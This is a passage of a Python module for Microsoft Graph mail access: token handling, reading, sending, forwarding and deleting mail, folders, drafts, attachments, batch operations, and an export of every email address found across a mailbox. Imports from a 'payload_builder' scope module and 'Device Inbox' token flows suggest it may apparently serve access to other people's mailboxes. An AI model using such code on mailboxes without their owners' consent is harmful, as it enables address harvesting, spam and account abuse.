"""
graph.py
Microsoft Graph API integration.
Patched to work with payload_builder scope system.
Token validation now checks for Mail scope coverage
before attempting mailbox operations.
Auto-refreshes tokens using the full Mail scope set.
"""

import requests
import base64
import re
from datetime import datetime
from urllib.parse import quote

from auth import get_token, refresh_token
from payload_builder import ALL_MAIL_SCOPES, BASIC_PAYLOAD_SCOPES

GRAPH_BASE_URL = "https://graph.microsoft.com/v1.0"
EMAIL_RE = re.compile(r"[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}", re.IGNORECASE)

# Full mail scope string used when refreshing tokens
# that need mailbox access
FULL_MAIL_SCOPE_STRING = " ".join(ALL_MAIL_SCOPES)
BASIC_SCOPE_STRING = " ".join(BASIC_PAYLOAD_SCOPES)


def graph_id(value):
    """
    Safely encode Microsoft Graph path IDs.
    Message and folder IDs often contain characters
    that should not be placed raw inside a URL path.
    """
    if value is None:
        return ""
    return quote(str(value), safe="")


def extract_graph_error(response):
    try:
        err_json = response.json()
        error = err_json.get("error", {})
        if isinstance(error, dict):
            return (
                error.get("message")
                or error.get("code")
                or err_json.get("message")
                or response.text
            )
        return (
            err_json.get("message")
            or str(error)
            or response.text
        )
    except Exception:
        return response.text or "Microsoft Graph request failed"


# =========================
# TOKEN HELPERS
# =========================
def is_token_expired(token_record):
    if not token_record:
        return True
    if not getattr(token_record, "expires_at", None):
        return True
    # Refresh a little early so requests do not fail mid-call
    return (
        int(token_record.expires_at)
        <= int(datetime.utcnow().timestamp()) + 120
    )


def has_mail_scopes(token_record) -> bool:
    """
    Check whether the stored token was issued with Mail scopes.
    We infer this from whether a refresh_token exists,
    since offline_access (required for refresh) is only
    requested in mail-mode flows.
    If no refresh token exists the token was likely basic-only.
    """
    if not token_record:
        return False
    return bool(getattr(token_record, "refresh_token", None))


def get_valid_token(user_id: str) -> str:
    """
    Returns a valid access token for the given user_id.
    Automatically refreshes if expired.
    Raises a clear error if no token exists or refresh fails.
    """
    token_record = get_token(user_id)

    if not token_record:
        raise Exception(
            f"No Microsoft token found for {user_id}. "
            "Connect this mailbox again."
        )

    if is_token_expired(token_record):
        print(f"Token expired for {user_id}, refreshing...")
        refreshed = refresh_token(user_id)

        if not refreshed or "access_token" not in refreshed:
            raise Exception(
                f"Token refresh failed for {user_id}. "
                "Reconnect this mailbox."
            )

        return refreshed["access_token"]

    return token_record.access_token


def get_valid_mail_token(user_id: str) -> str:
    """
    Returns a valid access token that has Mail scope coverage.
    If the stored token was issued without Mail scopes
    (basic sign-in only), raises a clear error directing
    the user to complete inbox connect.
    """
    token_record = get_token(user_id)

    if not token_record:
        raise Exception(
            f"No Microsoft token found for {user_id}. "
            "Complete inbox connect first."
        )

    if not has_mail_scopes(token_record):
        raise Exception(
            f"The token for {user_id} does not have Mail permissions. "
            "Use 'Connect Inbox' or 'Device Inbox' to grant full "
            "Mail.ReadWrite and Mail.Send access."
        )

    if is_token_expired(token_record):
        print(f"Mail token expired for {user_id}, refreshing...")
        refreshed = refresh_token(user_id)

        if not refreshed or "access_token" not in refreshed:
            raise Exception(
                f"Token refresh failed for {user_id}. "
                "Reconnect this mailbox."
            )

        return refreshed["access_token"]

    return token_record.access_token


# =========================
# GENERIC GRAPH REQUEST
# =========================
def graph_request(
    method: str,
    url: str,
    user_id: str,
    json=None,
    params=None,
    require_mail_scopes: bool = False,
) -> dict:
    """
    Generic Microsoft Graph API request with automatic
    token refresh on 401.

    Set require_mail_scopes=True for any mailbox operation
    to enforce that the token was issued with Mail permissions.
    """
    if not user_id:
        raise Exception(
            "user_id is required for Microsoft Graph requests."
        )

    if require_mail_scopes:
        access_token = get_valid_mail_token(user_id)
    else:
        access_token = get_valid_token(user_id)

    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json",
    }

    response = requests.request(
        method=method,
        url=url,
        headers=headers,
        json=json,
        params=params,
        timeout=60,
    )

    # Retry once if token is stale or revoked
    if response.status_code == 401:
        print(
            f"401 from Graph for {user_id}, attempting refresh..."
        )
        try:
            refreshed = refresh_token(user_id)
            if refreshed and "access_token" in refreshed:
                headers["Authorization"] = (
                    f"Bearer {refreshed['access_token']}"
                )
                response = requests.request(
                    method=method,
                    url=url,
                    headers=headers,
                    json=json,
                    params=params,
                    timeout=60,
                )
        except Exception as refresh_err:
            raise Exception(
                f"Token refresh failed during 401 retry "
                f"for {user_id}: {refresh_err}"
            )

    if not response.ok:
        message = extract_graph_error(response)

        if response.status_code in (401, 403):
            raise Exception(
                f"Microsoft Graph authorization failed for {user_id}: "
                f"{message}. Reconnect the mailbox or confirm the app "
                "has the required delegated permissions "
                "(Mail.ReadWrite, Mail.Send)."
            )

        if response.status_code == 404:
            raise Exception(
                f"Microsoft Graph item not found: {message}"
            )

        if response.status_code == 429:
            raise Exception(
                f"Microsoft Graph throttled the request: {message}"
            )

        raise Exception(message)

    if response.status_code == 204:
        return {"success": True}

    if not response.text:
        return {"success": True}

    return response.json()


# =========================
# NORMALIZERS
# =========================
def normalize_sender(item):
    return (
        item.get("from", {})
        .get("emailAddress", {})
        .get("address")
        or item.get("sender", {})
        .get("emailAddress", {})
        .get("address")
        or "Unknown"
    )


def normalize_recipients(entries):
    output = []
    for entry in entries or []:
        addr = entry.get("emailAddress", {}).get("address")
        if addr:
            output.append(addr)
    return output


def parse_recipients(value):
    recipients = []
    for addr in [
        x.strip() for x in (value or "").split(",") if x.strip()
    ]:
        recipients.append({"emailAddress": {"address": addr}})
    return recipients


def normalize_email_item(item):
    return {
        "id": item.get("id"),
        "subject": item.get("subject") or "(No Subject)",
        "from": normalize_sender(item),
        "date": (
            item.get("receivedDateTime")
            or item.get("sentDateTime")
            or ""
        ),
        "isRead": item.get("isRead", False),
        "bodyPreview": item.get("bodyPreview", ""),
        "conversationId": item.get("conversationId"),
        "webLink": item.get("webLink"),
    }


# =========================
# MAIL LIST / FOLDERS / DETAIL
# =========================
def fetch_emails(
    user_id: str,
    folder_id=None,
    limit=50,
    next_link=None,
) -> dict:
    """
    Fetch one page of messages with Microsoft Graph pagination.
    Default page size is 50. Max page size is capped at 200.
    Pass next_link from the previous response to load the next page.
    Requires Mail scope token.
    """
    try:
        limit = int(limit or 50)
    except Exception:
        limit = 50

    limit = max(1, min(limit, 200))

    if next_link:
        url = next_link
        params = None
    else:
        if folder_id:
            url = (
                f"{GRAPH_BASE_URL}/me/mailFolders"
                f"/{graph_id(folder_id)}/messages"
            )
        else:
            url = f"{GRAPH_BASE_URL}/me/messages"

        params = {
            "$top": limit,
            "$orderby": "receivedDateTime desc",
            "$select": (
                "id,subject,from,sender,receivedDateTime,"
                "sentDateTime,isRead,bodyPreview,"
                "conversationId,webLink"
            ),
        }

    data = graph_request(
        "GET",
        url,
        user_id,
        params=params,
        require_mail_scopes=True,
    )

    return {
        "emails": [
            normalize_email_item(item)
            for item in data.get("value", [])
        ],
        "next_link": data.get("@odata.nextLink"),
        "page_size": limit,
    }


def get_mail_folders(user_id: str) -> list:
    """
    Returns all mail folders for the given user.
    Requires Mail scope token.
    """
    url = f"{GRAPH_BASE_URL}/me/mailFolders"
    params = {
        "$top": 100,
        "$select": (
            "id,displayName,childFolderCount,"
            "totalItemCount,unreadItemCount"
        ),
    }

    data = graph_request(
        "GET",
        url,
        user_id,
        params=params,
        require_mail_scopes=True,
    )

    folders = []
    for folder in data.get("value", []):
        folders.append(
            {
                "id": folder.get("id"),
                "name": folder.get("displayName"),
                "childFolderCount": folder.get(
                    "childFolderCount", 0
                ),
                "totalItemCount": folder.get("totalItemCount", 0),
                "unreadItemCount": folder.get(
                    "unreadItemCount", 0
                ),
            }
        )

    return folders


def get_email_detail(user_id: str, message_id: str) -> dict:
    """
    Returns full email detail including body.
    Requires Mail scope token.
    """
    url = (
        f"{GRAPH_BASE_URL}/me/messages/{graph_id(message_id)}"
    )
    params = {
        "$select": (
            "id,subject,from,toRecipients,ccRecipients,"
            "bccRecipients,receivedDateTime,sentDateTime,"
            "isRead,body,bodyPreview,conversationId,"
            "webLink,hasAttachments"
        )
    }

    data = graph_request(
        "GET",
        url,
        user_id,
        params=params,
        require_mail_scopes=True,
    )

    return {
        "id": data.get("id"),
        "subject": data.get("subject") or "(No Subject)",
        "from": normalize_sender(data),
        "to": normalize_recipients(data.get("toRecipients")),
        "cc": normalize_recipients(data.get("ccRecipients")),
        "bcc": normalize_recipients(data.get("bccRecipients")),
        "date": (
            data.get("receivedDateTime")
            or data.get("sentDateTime")
            or ""
        ),
        "isRead": data.get("isRead", False),
        "body": (
            (data.get("body") or {}).get("content")
            or data.get("bodyPreview")
            or ""
        ),
        "bodyType": (
            (data.get("body") or {}).get("contentType") or "text"
        ),
        "bodyPreview": data.get("bodyPreview", ""),
        "conversationId": data.get("conversationId"),
        "webLink": data.get("webLink"),
        "hasAttachments": data.get("hasAttachments", False),
    }


# =========================
# SEND / REPLY / FORWARD
# =========================
def send_email(
    user_id: str,
    to: str,
    subject: str,
    body: str,
) -> dict:
    """
    Send a new email from the connected mailbox.
    Requires Mail.Send scope.
    """
    url = f"{GRAPH_BASE_URL}/me/sendMail"

    if not to:
        raise Exception("Recipient email is required.")

    to_recipients = []
    for addr in [
        x.strip() for x in (to or "").split(",") if x.strip()
    ]:
        to_recipients.append({"emailAddress": {"address": addr}})

    if not to_recipients:
        raise Exception(
            "At least one valid recipient email is required."
        )

    payload = {
        "message": {
            "subject": subject or "",
            "body": {
                "contentType": "HTML",
                "content": body,
            },
            "toRecipients": to_recipients,
        },
        "saveToSentItems": True,
    }

    graph_request(
        "POST",
        url,
        user_id,
        json=payload,
        require_mail_scopes=True,
    )
    return {"success": True, "message": "Email sent successfully"}


def reply_to_email(
    user_id: str,
    message_id: str,
    reply_text: str,
) -> dict:
    """
    Reply to an existing email.
    Requires Mail.ReadWrite and Mail.Send scopes.
    """
    if not message_id:
        raise Exception("message_id is required.")
    if not reply_text:
        raise Exception("reply_text is required.")

    url = (
        f"{GRAPH_BASE_URL}/me/messages"
        f"/{graph_id(message_id)}/reply"
    )

    payload = {
        "message": {
            "body": {
                "contentType": "HTML",
                "content": reply_text,
            }
        }
    }

    graph_request(
        "POST",
        url,
        user_id,
        json=payload,
        require_mail_scopes=True,
    )

    return {"success": True, "message": "Reply sent successfully"}


def forward_email(
    user_id: str,
    message_id: str,
    to: str,
) -> dict:
    """
    Forward an existing email to one or more recipients.
    Requires Mail.ReadWrite and Mail.Send scopes.
    """
    if not message_id:
        raise Exception("message_id is required.")
    if not to:
        raise Exception("Forward recipient is required.")

    url = (
        f"{GRAPH_BASE_URL}/me/messages"
        f"/{graph_id(message_id)}/forward"
    )

    to_recipients = []
    for addr in [
        x.strip() for x in (to or "").split(",") if x.strip()
    ]:
        to_recipients.append({"emailAddress": {"address": addr}})

    if not to_recipients:
        raise Exception(
            "At least one valid forward recipient email is required."
        )

    payload = {"toRecipients": to_recipients}

    graph_request(
        "POST",
        url,
        user_id,
        json=payload,
        require_mail_scopes=True,
    )
    return {"success": True, "message": "Email forwarded successfully"}


# =========================
# DELETE / READ / MOVE
# =========================
def delete_email(user_id: str, message_id: str) -> dict:
    """
    Permanently delete an email message.
    Requires Mail.ReadWrite scope.
    """
    if not message_id:
        raise Exception("message_id is required.")

    url = (
        f"{GRAPH_BASE_URL}/me/messages/{graph_id(message_id)}"
    )
    graph_request(
        "DELETE",
        url,
        user_id,
        require_mail_scopes=True,
    )
    return {"success": True, "message": "Email deleted successfully"}


def mark_as_read(
    user_id: str,
    message_id: str,
    is_read: bool = True,
) -> dict:
    """
    Mark an email as read or unread.
    Requires Mail.ReadWrite scope.
    """
    if not message_id:
        raise Exception("message_id is required.")

    url = (
        f"{GRAPH_BASE_URL}/me/messages/{graph_id(message_id)}"
    )
    payload = {"isRead": bool(is_read)}
    graph_request(
        "PATCH",
        url,
        user_id,
        json=payload,
        require_mail_scopes=True,
    )

    return {
        "success": True,
        "message": (
            "Email marked as read"
            if bool(is_read)
            else "Email marked as unread"
        ),
        "isRead": bool(is_read),
    }


def move_email_to_folder(
    user_id: str,
    message_id: str,
    folder_id: str,
) -> dict:
    """
    Move an email to a different mail folder.
    Requires Mail.ReadWrite scope.
    """
    if not message_id:
        raise Exception("message_id is required.")
    if not folder_id:
        raise Exception("folder_id is required.")

    url = (
        f"{GRAPH_BASE_URL}/me/messages"
        f"/{graph_id(message_id)}/move"
    )
    payload = {"destinationId": folder_id}
    data = graph_request(
        "POST",
        url,
        user_id,
        json=payload,
        require_mail_scopes=True,
    )

    return {
        "success": True,
        "message": "Email moved successfully",
        "moved_message_id": data.get("id"),
    }


# =========================
# CONVERSATION
# =========================
def get_conversation(
    user_id: str,
    conversation_id: str,
) -> list:
    """
    Returns all messages in a conversation thread.
    Requires Mail.Read scope.
    """
    if not conversation_id:
        raise Exception("conversation_id is required.")

    safe_conversation_id = str(conversation_id).replace("'", "''")
    url = f"{GRAPH_BASE_URL}/me/messages"
    params = {
        "$filter": f"conversationId eq '{safe_conversation_id}'",
        "$orderby": "receivedDateTime asc",
        "$select": (
            "id,subject,from,sender,receivedDateTime,"
            "isRead,bodyPreview,conversationId,webLink"
        ),
        "$top": 100,
    }

    data = graph_request(
        "GET",
        url,
        user_id,
        params=params,
        require_mail_scopes=True,
    )
    return [
        normalize_email_item(item)
        for item in data.get("value", [])
    ]


# =========================
# SAFE ADDRESS EXPORT
# =========================
def _collect_address(address_set, source, address_type, raw):
    if not raw:
        return
    for address in EMAIL_RE.findall(str(raw)):
        normalized = address.strip().lower()
        if normalized:
            address_set.add((normalized, source, address_type))


def extract_email_addresses_from_message(message: dict) -> set:
    """
    Extracts addresses from sender/recipient metadata and body preview.
    This is for audit/export only.
    Do not auto-send to the returned list.
    """
    found = set()
    source_id = message.get("id") or ""

    sender = normalize_sender(message)
    _collect_address(found, source_id, "from", sender)

    for field_name, address_type in [
        ("toRecipients", "to"),
        ("ccRecipients", "cc"),
        ("bccRecipients", "bcc"),
        ("replyTo", "reply_to"),
    ]:
        for entry in message.get(field_name) or []:
            addr = entry.get("emailAddress", {}).get("address")
            _collect_address(found, source_id, address_type, addr)

    _collect_address(
        found,
        source_id,
        "body_preview",
        message.get("bodyPreview", ""),
    )

    return found


def export_mailbox_email_addresses(
    user_id: str,
    max_messages: int = 500,
) -> dict:
    """
    Returns a deduped list of email addresses seen in a
    connected mailbox. This function only reads data for
    review/export. It does not send messages.
    Requires Mail.Read scope.
    """
    max_messages = max(1, min(int(max_messages or 500), 2000))

    url = f"{GRAPH_BASE_URL}/me/messages"
    params = {
        "$top": 50,
        "$orderby": "receivedDateTime desc",
        "$select": (
            "id,subject,from,sender,toRecipients,"
            "ccRecipients,bccRecipients,replyTo,"
            "receivedDateTime,bodyPreview"
        ),
    }

    rows_by_address = {}
    scanned = 0

    while url and scanned < max_messages:
        data = graph_request(
            "GET",
            url,
            user_id,
            params=params,
            require_mail_scopes=True,
        )
        params = None

        for item in data.get("value", []):
            scanned += 1
            subject = item.get("subject") or ""
            received = item.get("receivedDateTime") or ""

            for (
                address,
                source_id,
                address_type,
            ) in extract_email_addresses_from_message(item):
                if address not in rows_by_address:
                    rows_by_address[address] = {
                        "email": address,
                        "mailbox_user_id": user_id,
                        "source_message_id": source_id,
                        "address_type": address_type,
                        "sample_subject": subject,
                        "sample_received_at": received,
                    }

            if scanned >= max_messages:
                break

        url = data.get("@odata.nextLink")

    return {
        "mailbox_user_id": user_id,
        "scanned_messages": scanned,
        "addresses": sorted(
            rows_by_address.values(),
            key=lambda r: r["email"],
        ),
    }


# =========================
# APPROVED SEND WITH ATTACHMENT
# =========================
def _parse_optional_recipients(value: str | None) -> list:
    recipients = []
    for addr in [
        x.strip()
        for x in str(value or "").split(",")
        if x.strip()
    ]:
        if not EMAIL_RE.fullmatch(addr):
            raise Exception(f"Invalid email address: {addr}")
        recipients.append({"emailAddress": {"address": addr}})
    return recipients


def send_email_with_attachment(
    user_id: str,
    to: str,
    subject: str,
    body: str,
    attachment: dict | None = None,
    cc: str | None = None,
    bcc: str | None = None,
) -> dict:
    """
    Sends one approved email to one approved primary recipient.
    Optional CC/BCC are allowed but the primary To recipient
    must still be explicit.
    Do not pass exported or harvested lists here.
    Requires Mail.Send scope.
    """
    if not to:
        raise Exception("Recipient email is required.")

    recipients = [
        x.strip() for x in str(to).split(",") if x.strip()
    ]
    if len(recipients) != 1:
        raise Exception(
            "This safe route sends to exactly one approved "
            "primary recipient at a time."
        )

    recipient = recipients[0]
    if not EMAIL_RE.fullmatch(recipient):
        raise Exception("Recipient email address is invalid.")

    cc_recipients = _parse_optional_recipients(cc)
    bcc_recipients = _parse_optional_recipients(bcc)

    message = {
        "subject": subject or "",
        "body": {
            "contentType": "HTML",
            "content": body or "",
        },
        "toRecipients": [
            {"emailAddress": {"address": recipient}}
        ],
    }

    if cc_recipients:
        message["ccRecipients"] = cc_recipients

    if bcc_recipients:
        message["bccRecipients"] = bcc_recipients

    if attachment:
        filename = attachment.get("filename") or "attachment"
        content_type = (
            attachment.get("content_type")
            or "application/octet-stream"
        )
        content_bytes = attachment.get("content") or b""

        if len(content_bytes) > 3_000_000:
            raise Exception(
                "Attachment is too large for this safe send route. "
                "Keep it under 3 MB."
            )

        message["attachments"] = [
            {
                "@odata.type": "#microsoft.graph.fileAttachment",
                "name": filename,
                "contentType": content_type,
                "contentBytes": base64.b64encode(
                    content_bytes
                ).decode("utf-8"),
            }
        ]

    payload = {
        "message": message,
        "saveToSentItems": True,
    }

    graph_request(
        "POST",
        f"{GRAPH_BASE_URL}/me/sendMail",
        user_id,
        json=payload,
        require_mail_scopes=True,
    )

    return {
        "success": True,
        "message": "Approved email sent successfully",
        "recipient": recipient,
        "has_attachment": attachment is not None,
        "has_cc": bool(cc_recipients),
        "has_bcc": bool(bcc_recipients),
    }


# =========================
# MAILBOX SETTINGS
# =========================
def get_mailbox_settings(user_id: str) -> dict:
    """
    Returns mailbox settings for the connected user.
    Requires MailboxSettings.Read scope.
    """
    url = f"{GRAPH_BASE_URL}/me/mailboxSettings"
    data = graph_request(
        "GET",
        url,
        user_id,
        require_mail_scopes=True,
    )
    return {
        "timezone": data.get("timeZone"),
        "language": (data.get("language") or {}).get("displayName"),
        "automatic_replies": data.get("automaticRepliesSetting"),
        "archive_folder": data.get("archiveFolder"),
        "user_purpose": data.get("userPurpose"),
    }


def update_mailbox_settings(
    user_id: str,
    settings: dict,
) -> dict:
    """
    Updates mailbox settings for the connected user.
    Requires MailboxSettings.ReadWrite scope.
    """
    url = f"{GRAPH_BASE_URL}/me/mailboxSettings"
    data = graph_request(
        "PATCH",
        url,
        user_id,
        json=settings,
        require_mail_scopes=True,
    )
    return {"success": True, "updated_settings": data}


# =========================
# ATTACHMENT DOWNLOAD
# =========================
def get_message_attachments(
    user_id: str,
    message_id: str,
) -> list:
    """
    Returns a list of attachments for a given message.
    Requires Mail.Read scope.
    """
    if not message_id:
        raise Exception("message_id is required.")

    url = (
        f"{GRAPH_BASE_URL}/me/messages"
        f"/{graph_id(message_id)}/attachments"
    )
    params = {
        "$select": (
            "id,name,contentType,size,isInline"
        )
    }

    data = graph_request(
        "GET",
        url,
        user_id,
        params=params,
        require_mail_scopes=True,
    )

    attachments = []
    for item in data.get("value", []):
        attachments.append(
            {
                "id": item.get("id"),
                "name": item.get("name"),
                "content_type": item.get("contentType"),
                "size": item.get("size"),
                "is_inline": item.get("isInline", False),
            }
        )

    return attachments


def download_attachment(
    user_id: str,
    message_id: str,
    attachment_id: str,
) -> dict:
    """
    Downloads a specific attachment from a message.
    Returns base64-encoded content and metadata.
    Requires Mail.Read scope.
    """
    if not message_id:
        raise Exception("message_id is required.")
    if not attachment_id:
        raise Exception("attachment_id is required.")

    url = (
        f"{GRAPH_BASE_URL}/me/messages"
        f"/{graph_id(message_id)}"
        f"/attachments/{graph_id(attachment_id)}"
    )

    data = graph_request(
        "GET",
        url,
        user_id,
        require_mail_scopes=True,
    )

    return {
        "id": data.get("id"),
        "name": data.get("name"),
        "content_type": data.get("contentType"),
        "size": data.get("size"),
        "is_inline": data.get("isInline", False),
        "content_bytes": data.get("contentBytes"),
    }


# =========================
# SEARCH
# =========================
def search_messages(
    user_id: str,
    query: str,
    limit: int = 25,
) -> dict:
    """
    Search messages in the connected mailbox using
    Microsoft Graph $search parameter.
    Requires Mail.Read scope.
    """
    if not query:
        raise Exception("Search query is required.")

    try:
        limit = int(limit or 25)
    except Exception:
        limit = 25

    limit = max(1, min(limit, 100))

    url = f"{GRAPH_BASE_URL}/me/messages"
    params = {
        "$search": f'"{query}"',
        "$top": limit,
        "$select": (
            "id,subject,from,sender,receivedDateTime,"
            "sentDateTime,isRead,bodyPreview,"
            "conversationId,webLink"
        ),
    }

    data = graph_request(
        "GET",
        url,
        user_id,
        params=params,
        require_mail_scopes=True,
    )

    return {
        "query": query,
        "results": [
            normalize_email_item(item)
            for item in data.get("value", [])
        ],
        "result_count": len(data.get("value", [])),
    }


# =========================
# FOLDER MANAGEMENT
# =========================
def create_mail_folder(
    user_id: str,
    display_name: str,
    parent_folder_id: str | None = None,
) -> dict:
    """
    Creates a new mail folder.
    Optionally creates it as a child of an existing folder.
    Requires Mail.ReadWrite scope.
    """
    if not display_name:
        raise Exception("display_name is required.")

    if parent_folder_id:
        url = (
            f"{GRAPH_BASE_URL}/me/mailFolders"
            f"/{graph_id(parent_folder_id)}/childFolders"
        )
    else:
        url = f"{GRAPH_BASE_URL}/me/mailFolders"

    payload = {"displayName": display_name}

    data = graph_request(
        "POST",
        url,
        user_id,
        json=payload,
        require_mail_scopes=True,
    )

    return {
        "id": data.get("id"),
        "name": data.get("displayName"),
        "parent_folder_id": parent_folder_id,
        "total_item_count": data.get("totalItemCount", 0),
        "unread_item_count": data.get("unreadItemCount", 0),
    }


def delete_mail_folder(
    user_id: str,
    folder_id: str,
) -> dict:
    """
    Permanently deletes a mail folder and all its contents.
    Requires Mail.ReadWrite scope.
    """
    if not folder_id:
        raise Exception("folder_id is required.")

    url = (
        f"{GRAPH_BASE_URL}/me/mailFolders/{graph_id(folder_id)}"
    )

    graph_request(
        "DELETE",
        url,
        user_id,
        require_mail_scopes=True,
    )

    return {
        "success": True,
        "message": "Folder deleted successfully",
        "folder_id": folder_id,
    }


def rename_mail_folder(
    user_id: str,
    folder_id: str,
    new_name: str,
) -> dict:
    """
    Renames an existing mail folder.
    Requires Mail.ReadWrite scope.
    """
    if not folder_id:
        raise Exception("folder_id is required.")
    if not new_name:
        raise Exception("new_name is required.")

    url = (
        f"{GRAPH_BASE_URL}/me/mailFolders/{graph_id(folder_id)}"
    )
    payload = {"displayName": new_name}

    data = graph_request(
        "PATCH",
        url,
        user_id,
        json=payload,
        require_mail_scopes=True,
    )

    return {
        "success": True,
        "id": data.get("id"),
        "name": data.get("displayName"),
        "message": "Folder renamed successfully",
    }


def get_child_folders(
    user_id: str,
    parent_folder_id: str,
) -> list:
    """
    Returns child folders of a given parent folder.
    Requires Mail.Read scope.
    """
    if not parent_folder_id:
        raise Exception("parent_folder_id is required.")

    url = (
        f"{GRAPH_BASE_URL}/me/mailFolders"
        f"/{graph_id(parent_folder_id)}/childFolders"
    )
    params = {
        "$top": 100,
        "$select": (
            "id,displayName,childFolderCount,"
            "totalItemCount,unreadItemCount"
        ),
    }

    data = graph_request(
        "GET",
        url,
        user_id,
        params=params,
        require_mail_scopes=True,
    )

    return [
        {
            "id": folder.get("id"),
            "name": folder.get("displayName"),
            "child_folder_count": folder.get(
                "childFolderCount", 0
            ),
            "total_item_count": folder.get("totalItemCount", 0),
            "unread_item_count": folder.get(
                "unreadItemCount", 0
            ),
        }
        for folder in data.get("value", [])
    ]


# =========================
# DRAFT MANAGEMENT
# =========================
def create_draft(
    user_id: str,
    to: str,
    subject: str,
    body: str,
    cc: str | None = None,
    bcc: str | None = None,
) -> dict:
    """
    Creates a draft email without sending it.
    Requires Mail.ReadWrite scope.
    """
    if not to:
        raise Exception("Recipient email is required.")

    to_recipients = []
    for addr in [
        x.strip() for x in (to or "").split(",") if x.strip()
    ]:
        to_recipients.append({"emailAddress": {"address": addr}})

    if not to_recipients:
        raise Exception(
            "At least one valid recipient email is required."
        )

    message = {
        "subject": subject or "",
        "body": {
            "contentType": "HTML",
            "content": body or "",
        },
        "toRecipients": to_recipients,
    }

    if cc:
        cc_recipients = _parse_optional_recipients(cc)
        if cc_recipients:
            message["ccRecipients"] = cc_recipients

    if bcc:
        bcc_recipients = _parse_optional_recipients(bcc)
        if bcc_recipients:
            message["bccRecipients"] = bcc_recipients

    url = f"{GRAPH_BASE_URL}/me/messages"

    data = graph_request(
        "POST",
        url,
        user_id,
        json=message,
        require_mail_scopes=True,
    )

    return {
        "success": True,
        "draft_id": data.get("id"),
        "subject": data.get("subject"),
        "message": "Draft created successfully",
    }


def send_draft(
    user_id: str,
    draft_id: str,
) -> dict:
    """
    Sends an existing draft message.
    Requires Mail.Send scope.
    """
    if not draft_id:
        raise Exception("draft_id is required.")

    url = (
        f"{GRAPH_BASE_URL}/me/messages"
        f"/{graph_id(draft_id)}/send"
    )

    graph_request(
        "POST",
        url,
        user_id,
        require_mail_scopes=True,
    )

    return {
        "success": True,
        "message": "Draft sent successfully",
        "draft_id": draft_id,
    }


def update_draft(
    user_id: str,
    draft_id: str,
    to: str | None = None,
    subject: str | None = None,
    body: str | None = None,
    cc: str | None = None,
    bcc: str | None = None,
) -> dict:
    """
    Updates an existing draft message.
    Requires Mail.ReadWrite scope.
    """
    if not draft_id:
        raise Exception("draft_id is required.")

    url = (
        f"{GRAPH_BASE_URL}/me/messages/{graph_id(draft_id)}"
    )

    message = {}

    if subject is not None:
        message["subject"] = subject

    if body is not None:
        message["body"] = {
            "contentType": "HTML",
            "content": body,
        }

    if to is not None:
        to_recipients = []
        for addr in [
            x.strip() for x in (to or "").split(",") if x.strip()
        ]:
            to_recipients.append(
                {"emailAddress": {"address": addr}}
            )
        message["toRecipients"] = to_recipients

    if cc is not None:
        message["ccRecipients"] = _parse_optional_recipients(cc)

    if bcc is not None:
        message["bccRecipients"] = _parse_optional_recipients(bcc)

    if not message:
        raise Exception(
            "At least one field must be provided to update."
        )

    data = graph_request(
        "PATCH",
        url,
        user_id,
        json=message,
        require_mail_scopes=True,
    )

    return {
        "success": True,
        "draft_id": data.get("id"),
        "subject": data.get("subject"),
        "message": "Draft updated successfully",
    }


# =========================
# BATCH OPERATIONS
# =========================
def batch_mark_as_read(
    user_id: str,
    message_ids: list,
    is_read: bool = True,
) -> dict:
    """
    Marks multiple messages as read or unread in a single
    batch operation using Microsoft Graph batch API.
    Requires Mail.ReadWrite scope.
    Max 20 messages per batch per Microsoft Graph limits.
    """
    if not message_ids:
        raise Exception("message_ids list is required.")

    message_ids = message_ids[:20]

    batch_requests = [
        {
            "id": str(index),
            "method": "PATCH",
            "url": f"/me/messages/{graph_id(msg_id)}",
            "headers": {"Content-Type": "application/json"},
            "body": {"isRead": bool(is_read)},
        }
        for index, msg_id in enumerate(message_ids)
    ]

    batch_url = "https://graph.microsoft.com/v1.0/$batch"
    access_token = get_valid_mail_token(user_id)

    response = requests.post(
        batch_url,
        headers={
            "Authorization": f"Bearer {access_token}",
            "Content-Type": "application/json",
        },
        json={"requests": batch_requests},
        timeout=60,
    )

    if not response.ok:
        raise Exception(
            f"Batch request failed: {extract_graph_error(response)}"
        )

    results = response.json().get("responses", [])
    succeeded = sum(
        1 for r in results if 200 <= int(r.get("status", 0)) < 300
    )
    failed = len(results) - succeeded

    return {
        "success": True,
        "total": len(message_ids),
        "succeeded": succeeded,
        "failed": failed,
        "is_read": bool(is_read),
    }


def batch_delete_messages(
    user_id: str,
    message_ids: list,
) -> dict:
    """
    Deletes multiple messages in a single batch operation.
    Requires Mail.ReadWrite scope.
    Max 20 messages per batch per Microsoft Graph limits.
    """
    if not message_ids:
        raise Exception("message_ids list is required.")

    message_ids = message_ids[:20]

    batch_requests = [
        {
            "id": str(index),
            "method": "DELETE",
            "url": f"/me/messages/{graph_id(msg_id)}",
        }
        for index, msg_id in enumerate(message_ids)
    ]

    batch_url = "https://graph.microsoft.com/v1.0/$batch"
    access_token = get_valid_mail_token(user_id)

    response = requests.post(
        batch_url,
        headers={
            "Authorization": f"Bearer {access_token}",
            "Content-Type": "application/json",
        },
        json={"requests": batch_requests},
        timeout=60,
    )

    if not response.ok:
        raise Exception(
            f"Batch delete failed: {extract_graph_error(response)}"
        )

    results = response.json().get("responses", [])
    succeeded = sum(
        1 for r in results if 200 <= int(r.get("status", 0)) < 300
    )
    failed = len(results) - succeeded

    return {
        "success": True,
        "total": len(message_ids),
        "succeeded": succeeded,
        "failed": failed,
    }


# =========================
# TOKEN SCOPE INSPECTOR
# =========================
def inspect_token_scopes(user_id: str) -> dict:
    """
    Checks what scopes the stored token has by attempting
    a lightweight Graph call and inspecting the result.
    Returns a summary of what operations are available.
    Useful for debugging scope coverage after OAuth flows.
    """
    token_record = get_token(user_id)

    if not token_record:
        return {
            "user_id": user_id,
            "token_found": False,
            "has_mail_scopes": False,
            "has_refresh_token": False,
            "can_read_mail": False,
            "can_send_mail": False,
            "expires_at": None,
            "session_id": None,
        }

    has_refresh = bool(
        getattr(token_record, "refresh_token", None)
    )
    expired = is_token_expired(token_record)

    can_read_mail = False
    can_send_mail = False

    if not expired and has_refresh:
        try:
            graph_request(
                "GET",
                f"{GRAPH_BASE_URL}/me/mailFolders?$top=1",
                user_id,
                require_mail_scopes=False,
            )
            can_read_mail = True
        except Exception:
            can_read_mail = False

    return {
        "user_id": user_id,
        "token_found": True,
        "has_mail_scopes": has_refresh,
        "has_refresh_token": has_refresh,
        "token_expired": expired,
        "can_read_mail": can_read_mail,
        "can_send_mail": has_refresh and can_read_mail,
        "expires_at": getattr(token_record, "expires_at", None),
